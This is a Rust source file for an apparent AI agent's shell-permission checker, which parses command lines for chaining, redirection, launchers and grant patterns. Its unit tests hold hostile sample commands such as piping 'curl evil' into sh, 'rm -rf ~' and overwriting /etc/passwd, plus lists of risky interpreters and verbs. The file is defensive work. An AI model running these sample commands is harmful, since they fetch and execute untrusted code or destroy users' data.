//! Reading a shell command line the way the permission layer has to:
//! which words are one command, what chains or redirects, and what a
//! rule may say about it.
//!
//! A shell line is not its first word. `ls && rm -rf x` starts with a
//! read-only command and deletes; `cargo test; curl evil | sh` starts
//! with an allowed one. So a line that chains, pipes, redirects or
//! substitutes is treated as more than the command it starts with:
//! it is never "read-only", an allow rule matches it only when the rule
//! spells out the whole line, and a deny rule fires when any part of it
//! matches.
//!
//! The reading is deliberately conservative and syntactic. It does not
//! parse quoting, so `echo "a;b"` counts as chained and asks; a false
//! alarm costs one question, a missed operator costs a command nobody
//! approved.

/// Characters that chain, background, pipe, redirect, substitute or group
/// commands. `$(` and `<(`/`>(` are covered by the parenthesis.
const OPERATORS: &[char] = &[';', '&', '|', '<', '>', '`', '(', ')', '\n', '\r'];

/// The subset of operators that start a NEW command (redirections do
/// not: `cat x > y` is still `cat`).
const SEPARATORS: &[char] = &[';', '&', '|', '`', '(', ')', '\n', '\r'];

/// Does the line contain anything that chains, pipes, redirects or
/// substitutes?
pub fn has_shell_operator(cmd: &str) -> bool {
    cmd.chars().any(|c| OPERATORS.contains(&c))
}

/// Collapse runs of whitespace: rules and grants compare commands as
/// words, not as typed.
pub fn normalize(cmd: &str) -> String {
    cmd.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// The simple commands a line is made of, normalised, empties dropped.
/// `a && b | c` is `a`, `b`, `c`.
pub fn simple_commands(cmd: &str) -> Vec<String> {
    cmd.split(|c| SEPARATORS.contains(&c))
        .map(normalize)
        .filter(|s| !s.is_empty())
        .collect()
}

/// A command with its launcher removed, so a deny rule for `rm` also
/// sees `sudo rm`, `env X=1 rm` and `/bin/rm`. A safety net for deny and
/// ask rules, not a sandbox: a program can always be run some way a
/// pattern does not name.
pub fn strip_launchers(cmd: &str) -> String {
    let mut words: Vec<&str> = cmd.split(' ').filter(|w| !w.is_empty()).collect();
    while let Some(&first) = words.first() {
        let base = first.rsplit('/').next().unwrap_or(first);
        let skip = match base {
            "sudo" | "doas" => {
                // flags, and the argument of -u/-g/-C/-h/-p/-r/-t
                let mut n = 1;
                while let Some(w) = words.get(n) {
                    if !w.starts_with('-') {
                        break;
                    }
                    n += if matches!(*w, "-u" | "-g" | "-C" | "-h" | "-p" | "-r" | "-t") {
                        2
                    } else {
                        1
                    };
                }
                n
            }
            "env" => {
                let mut n = 1;
                while let Some(w) = words.get(n) {
                    if w.contains('=') || w.starts_with('-') {
                        n += if *w == "-u" { 2 } else { 1 };
                    } else {
                        break;
                    }
                }
                n
            }
            "nice" | "ionice" => {
                let mut n = 1;
                while let Some(w) = words.get(n) {
                    if w.starts_with('-') {
                        n += if matches!(*w, "-n" | "-c") { 2 } else { 1 };
                    } else {
                        break;
                    }
                }
                n
            }
            "timeout" => {
                let mut n = 1;
                while words.get(n).is_some_and(|w| w.starts_with('-')) {
                    n += 1;
                }
                n + 1 // the duration
            }
            "nohup" | "time" | "command" | "exec" | "stdbuf" | "setsid" => 1,
            _ => break,
        };
        if skip >= words.len() {
            return String::new();
        }
        words.drain(..skip);
    }
    // `/usr/bin/rm -rf x` is `rm -rf x`.
    if let Some(first) = words.first().copied() {
        if first.contains('/') && !first.ends_with('/') {
            words[0] = first.rsplit('/').next().unwrap_or(first);
        }
    }
    words.join(" ")
}

/// Does `pattern` match ONE simple command? `cargo test *` is the words
/// `cargo test` followed by anything (so `cargo testament` is not it);
/// other `*` shapes are globs; no `*` is the exact line.
fn simple_matches(pattern: &str, cmd: &str) -> bool {
    if let Some(prefix) = pattern.strip_suffix(" *") {
        return cmd == prefix || cmd.strip_prefix(prefix).is_some_and(|r| r.starts_with(' '));
    }
    if pattern.contains('*') {
        return crate::glob_match(pattern, cmd);
    }
    pattern == cmd
}

/// Does a Bash rule pattern match a command line? `allow` is whether the
/// rule would let the command run (true) or stop/ask about it (false).
///
/// * An empty pattern or `*` is the whole tool.
/// * An ALLOW rule speaks for one simple command. A line with an
///   operator in it is more than that, so only a pattern that spells out
///   the whole line matches it.
/// * A DENY or ASK rule fires when ANY simple command of the line
///   matches, with launchers (`sudo`, `env`, a path) looked through.
pub fn rule_matches_command(pattern: &str, command: &str, allow: bool) -> bool {
    let pattern = normalize(pattern);
    if pattern.is_empty() || pattern == "*" {
        return true;
    }
    // Operators are read off the line as typed: normalising turns a
    // newline into a space and would hide it.
    let chained = has_shell_operator(command);
    let parts = simple_commands(command);
    let command = normalize(command);
    if allow {
        if chained {
            return pattern == command;
        }
        return simple_matches(&pattern, &command);
    }
    if pattern == command || simple_matches(&pattern, &command) {
        return true;
    }
    parts.into_iter().any(|part| {
        simple_matches(&pattern, &part) || simple_matches(&pattern, &strip_launchers(&part))
    })
}

/// Flags that make an allowlisted command do more than read.
fn has_effectful_flag(words: &[&str]) -> bool {
    let rest = &words[1..];
    match words[0] {
        // find runs programs and deletes with these.
        "find" => rest.iter().any(|w| {
            matches!(
                *w,
                "-exec"
                    | "-execdir"
                    | "-ok"
                    | "-okdir"
                    | "-delete"
                    | "-fprint"
                    | "-fprint0"
                    | "-fprintf"
                    | "-fls"
            )
        }),
        // rg --pre runs a program on every file.
        "rg" | "grep" => rest
            .iter()
            .any(|w| w.starts_with("--pre") || w.starts_with("--hostname-bin")),
        // tree -o writes a file.
        "tree" => rest.iter().any(|w| *w == "-o" || w.starts_with("--output")),
        "git" => {
            // `--output` writes a file from diff, log and show.
            if rest.iter().any(|w| w.starts_with("--output")) {
                return true;
            }
            // `git branch` lists with no arguments or with listing
            // flags; a branch name or -d/-m/-c/-f creates, renames or
            // deletes.
            if rest.first() == Some(&"branch") {
                const LISTING: &[&str] = &[
                    "-a",
                    "-r",
                    "-v",
                    "-vv",
                    "--all",
                    "--remotes",
                    "--verbose",
                    "--list",
                    "-l",
                    "--show-current",
                    "--no-color",
                    "--color",
                ];
                return rest[1..].iter().any(|w| !LISTING.contains(w));
            }
            false
        }
        _ => false,
    }
}

/// Commands that never need approval in default mode: the allowlisted
/// read-only commands, with no operator and no effectful flag.
pub fn is_readonly(cmd: &str, allowlist: &[&str]) -> bool {
    if has_shell_operator(cmd) {
        return false;
    }
    let cmd = normalize(cmd);
    if cmd.is_empty() {
        return false;
    }
    let listed = allowlist
        .iter()
        .any(|a| cmd == *a || cmd.strip_prefix(a).is_some_and(|r| r.starts_with(' ')));
    if !listed {
        return false;
    }
    let words: Vec<&str> = cmd.split(' ').collect();
    !has_effectful_flag(&words)
}

/// Programs that run whatever they are given: a wildcard grant for one
/// of these is a grant for anything.
const INTERPRETERS: &[&str] = &[
    "sh", "bash", "zsh", "fish", "dash", "ksh", "csh", "python", "python3", "node", "nodejs",
    "deno", "bun", "ruby", "perl", "php", "lua", "eval", "exec", "source", ".", "xargs", "sudo",
    "doas", "env", "ssh", "su", "docker", "podman", "kubectl", "watch", "nohup", "timeout", "time",
    "command", "busybox", "awk", "sed", "make",
];

/// Programs whose second word is the verb that decides what they do:
/// a grant for one of these names the verb as well.
const MULTIPLEXERS: &[&str] = &[
    "cargo", "git", "npm", "pnpm", "yarn", "go", "rustup", "pip", "pip3", "uv", "poetry", "gradle",
    "mvn", "dotnet", "gh", "just",
];

/// Verbs of a multiplexer that run arbitrary code or reach out, and so
/// are never granted by wildcard.
const RISKY_VERBS: &[(&str, &[&str])] = &[
    (
        "cargo",
        &["run", "install", "publish", "login", "owner", "yank"],
    ),
    (
        "npm",
        &[
            "exec", "x", "publish", "login", "adduser", "install", "i", "ci",
        ],
    ),
    (
        "pnpm",
        &["exec", "dlx", "publish", "login", "install", "i", "add"],
    ),
    (
        "yarn",
        &["exec", "dlx", "publish", "login", "install", "add"],
    ),
    ("pip", &["install"]),
    ("pip3", &["install"]),
    ("uv", &["run", "pip", "tool", "publish"]),
    ("poetry", &["run", "publish", "install"]),
    ("go", &["run", "install", "generate"]),
    (
        "git",
        &[
            "push",
            "config",
            "remote",
            "clean",
            "reset",
            "rebase",
            "filter-branch",
        ],
    ),
    ("gh", &["api", "auth", "release", "secret", "repo"]),
    ("gradle", &["publish"]),
    ("mvn", &["deploy"]),
];

/// The rule a "this kind of call" grant would add for a Bash command:
/// `Some("cargo test *")` for `cargo test --release`, `Some("git status")`
/// for the exact line, or `None` when there is nothing narrower than the
/// whole tool to offer.
///
/// The choice is conservative on purpose: wildcards only for the verb of
/// a known multiplexer, only for a plain command with no operator, and
/// never for an interpreter or a verb that runs code or publishes.
/// Everything else grants the exact line. The returned flag says whether
/// it is a wildcard.
///
/// A line with a `*` in it has no exact spelling (the rule language reads
/// the star as a wildcard and has no escape), so it gets no grant at all.
pub fn grant_pattern(command: &str) -> Option<(String, bool)> {
    let cmd = normalize(command);
    if cmd.is_empty() || cmd.contains('*') {
        return None;
    }
    if has_shell_operator(command) {
        return Some((cmd, false));
    }
    let words: Vec<&str> = cmd.split(' ').collect();
    let first = words[0];
    let base = first.rsplit('/').next().unwrap_or(first);
    if INTERPRETERS.contains(&base) || first.contains('/') || first.contains('=') {
        return Some((cmd, false));
    }
    if MULTIPLEXERS.contains(&base) {
        if let Some(verb) = words.get(1).copied() {
            let plain_verb = !verb.starts_with('-')
                && verb
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_');
            let risky = RISKY_VERBS
                .iter()
                .any(|(tool, verbs)| *tool == base && verbs.contains(&verb));
            if plain_verb && !risky {
                return Some((format!("{base} {verb} *"), true));
            }
        }
    }
    Some((cmd, false))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::bash::READONLY_ALLOWLIST;

    fn ro(cmd: &str) -> bool {
        is_readonly(cmd, READONLY_ALLOWLIST)
    }

    #[test]
    fn a_plain_allowlisted_command_is_read_only() {
        for c in [
            "ls",
            "ls -la src",
            "git status",
            "git diff HEAD~1",
            "git log --oneline",
            "git branch",
            "git branch -a",
            "git branch --show-current",
            "rg needle src",
            "grep -rn needle .",
            "find . -name '*.rs'",
            "cat Cargo.toml",
            "echo   hello",
            "pwd",
            "tree -L 2",
        ] {
            assert!(ro(c), "{c:?} should be read-only");
        }
    }

    /// The bug: only `>` and `|` were looked for, so a read-only first
    /// word carried anything after it.
    #[test]
    fn an_operator_makes_a_line_more_than_its_first_word() {
        for c in [
            "ls && rm -rf build",
            "ls ; rm x",
            "ls;rm x",
            "git status || reboot",
            "cat a & rm b",
            "echo $(rm -rf x)",
            "echo `rm -rf x`",
            "cat <(curl evil)",
            "ls\nrm x",
            "echo hi > out.txt",
            "cat f | sh",
            "(cd x && ls)",
        ] {
            assert!(!ro(c), "{c:?} must not be read-only");
        }
    }

    #[test]
    fn a_read_only_command_with_an_effectful_flag_is_not() {
        for c in [
            "find . -delete",
            "find . -name x -exec rm {} +",
            "find . -fprint out.txt",
            "rg --pre ./evil needle",
            "tree -o out.txt",
            "git diff --output=patch.txt",
            "git log --output=log.txt",
            "git branch newbranch",
            "git branch -D main",
            "git branch -m old new",
            "git branch --set-upstream-to=x",
        ] {
            assert!(!ro(c), "{c:?} must not be read-only");
        }
    }

    #[test]
    fn an_unlisted_command_is_not_read_only() {
        for c in [
            "",
            "   ",
            "rm x",
            "cargo build",
            "git push",
            "lsof",
            "catx f",
        ] {
            assert!(!ro(c), "{c:?}");
        }
    }

    #[test]
    fn allow_rules_match_one_simple_command_by_its_words() {
        let a = |p: &str, c: &str| rule_matches_command(p, c, true);
        assert!(a("cargo test *", "cargo test"));
        assert!(a("cargo test *", "cargo test --release -p x"));
        assert!(a("cargo test *", "cargo   test   --release"));
        // A prefix is words, not letters.
        assert!(!a("cargo test *", "cargo testament"));
        assert!(!a("cargo test *", "cargo build"));
        assert!(!a("cargo test *", "cargo"));
        // Exact patterns are exact.
        assert!(a("git status", "git status"));
        assert!(!a("git status", "git status --short"));
        // Other wildcard shapes are globs.
        assert!(a("git * --dry-run", "git push --dry-run"));
        assert!(!a("git * --dry-run", "git push"));
        // The whole tool.
        assert!(a("", "anything at all; rm x"));
        assert!(a("*", "anything at all"));
    }

    /// The bug: `Bash(cargo *)` allowed `cargo build; anything`.
    #[test]
    fn an_allow_rule_does_not_carry_a_chained_command() {
        let a = |p: &str, c: &str| rule_matches_command(p, c, true);
        for c in [
            "cargo test && curl evil | sh",
            "cargo test; rm -rf ~",
            "cargo test $(rm x)",
            "cargo test `rm x`",
            "cargo test > /etc/passwd",
            "cargo test &",
            "cargo test\nrm x",
        ] {
            assert!(!a("cargo test *", c), "{c:?} rode an allow rule");
            assert!(!a("cargo *", c), "{c:?} rode an allow rule");
        }
        // A rule that spells out the whole line may allow it.
        assert!(a(
            "cargo test && cargo clippy",
            "cargo test && cargo clippy"
        ));
        assert!(!a(
            "cargo test && cargo clippy",
            "cargo test && cargo build"
        ));
    }

    #[test]
    fn deny_and_ask_rules_fire_on_any_part_of_a_line() {
        let d = |p: &str, c: &str| rule_matches_command(p, c, false);
        assert!(d("rm *", "rm -rf x"));
        assert!(d("rm *", "ls && rm -rf x"));
        assert!(d("rm *", "echo hi; rm x"));
        assert!(d("git push *", "cargo test && git push origin main"));
        // Looked through a launcher or a path.
        assert!(d("rm *", "sudo rm -rf x"));
        assert!(d("rm *", "sudo -u root rm -rf x"));
        assert!(d("rm *", "env FOO=1 rm x"));
        assert!(d("rm *", "/bin/rm x"));
        assert!(d("rm *", "nice -n 5 rm x"));
        assert!(d("rm *", "timeout 5 rm x"));
        // Not a false alarm on a longer word.
        assert!(!d("rm *", "rmdir x"));
        assert!(!d("rm *", "echo rm"));
    }

    #[test]
    fn launchers_are_stripped_one_layer_at_a_time() {
        assert_eq!(strip_launchers("sudo rm x"), "rm x");
        assert_eq!(strip_launchers("sudo -u bob env A=1 /usr/bin/rm x"), "rm x");
        assert_eq!(strip_launchers("nohup time cargo test"), "cargo test");
        assert_eq!(strip_launchers("cargo test"), "cargo test");
        // Nothing left after the launcher.
        assert_eq!(strip_launchers("sudo"), "");
    }

    /// What a "this kind of command" grant offers. The first two words
    /// of a known multiplexer with a plain verb get a wildcard; everything
    /// else is the exact line, and a line with an operator is only ever
    /// itself.
    #[test]
    fn a_grant_is_a_wildcard_only_where_the_verb_bounds_it() {
        let g = |c: &str| grant_pattern(c);
        let wild = |p: &str| Some((p.to_string(), true));
        let exact = |p: &str| Some((p.to_string(), false));
        assert_eq!(g("cargo test --release"), wild("cargo test *"));
        assert_eq!(g("git status"), wild("git status *"));
        assert_eq!(g("npm run build"), wild("npm run *"));
        assert_eq!(g("cargo   fmt"), wild("cargo fmt *"));
        // Verbs that run code, publish or change the repo's remotes.
        assert_eq!(g("cargo run -- --evil"), exact("cargo run -- --evil"));
        assert_eq!(g("cargo install x"), exact("cargo install x"));
        assert_eq!(g("git push origin main"), exact("git push origin main"));
        assert_eq!(g("npm exec evil"), exact("npm exec evil"));
        assert_eq!(
            g("git config --global x y"),
            exact("git config --global x y")
        );
        // Interpreters run anything.
        assert_eq!(g("python3 test_calc.py"), exact("python3 test_calc.py"));
        assert_eq!(g("bash -c 'x'"), exact("bash -c 'x'"));
        assert_eq!(g("node script.js"), exact("node script.js"));
        assert_eq!(g("make build"), exact("make build"));
        assert_eq!(g("sudo rm x"), exact("sudo rm x"));
        // An unknown command is only itself.
        assert_eq!(g("pytest -x tests/"), exact("pytest -x tests/"));
        assert_eq!(g("./run.sh"), exact("./run.sh"));
        assert_eq!(g("FOO=1 cargo test"), exact("FOO=1 cargo test"));
        // A flag is not a verb.
        assert_eq!(g("cargo --version"), exact("cargo --version"));
        // Operators: only ever the exact line.
        assert_eq!(
            g("cargo test && cargo clippy"),
            exact("cargo test && cargo clippy")
        );
        assert_eq!(g("cargo test > out"), exact("cargo test > out"));
        assert_eq!(g(""), None);
        // A literal star cannot be spelled in a rule: no grant to offer.
        assert_eq!(g("rm *.o"), None);
        assert_eq!(g("grep -r 'a*' ."), None);
    }

    /// A grant must match the call it was made for, and must not match a
    /// chained version of it.
    #[test]
    fn a_grant_matches_its_own_call_and_nothing_chained() {
        for c in [
            "cargo test --release",
            "git status",
            "python3 x.py",
            "cargo test && ls",
        ] {
            let (pat, _) = grant_pattern(c).unwrap();
            assert!(rule_matches_command(&pat, c, true), "{pat:?} vs {c:?}");
        }
        let (pat, _) = grant_pattern("cargo test").unwrap();
        assert!(!rule_matches_command(&pat, "cargo test; rm -rf ~", true));
        assert!(!rule_matches_command(&pat, "cargo build", true));
    }
}
